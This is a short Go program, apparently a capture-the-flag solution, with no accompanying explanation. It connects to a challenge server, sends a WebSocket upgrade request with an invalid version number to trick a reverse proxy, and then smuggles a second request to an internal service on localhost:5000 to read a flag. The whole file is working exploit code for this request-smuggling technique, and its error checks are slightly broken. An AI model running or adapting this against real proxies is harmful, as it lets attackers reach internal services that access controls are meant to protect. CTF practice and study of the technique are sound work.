package main

import (
    "log"
    "net"
    "io"
)

func main() {
    conn, err := net.Dial("tcp", "challenge.0ang3el.tk:80")
    if nil != err {
        log.Fatalf("failed to connect to server")
    }
    req1 := "GET /socket.io/?transport-websocket HTTP/1.1\r\nHost: localhost:80\r\nSec-WebSocket-Version: 4444\r\nUpgrade: websocket\r\n\r\n"
    req2 := "GET /flag HTTP/1.1\r\nHost: localhost:5000\r\n\r\n"
    recvBuf := make([]byte, 4096)
    conn.Write([]byte(req1))
    conn.Read(recvBuf)
    conn.Write([]byte(req2))
    conn.Read(recvBuf)
    log.Printf("%s",recvBuf)
    if nil != err {
        if io.EOF == err {
            log.Printf("connection is closed from client; %v", conn.RemoteAddr().String())
            return
        }
        log.Printf("fail to receive data; err: %v", err)
        return
    }
    conn.Close()
}
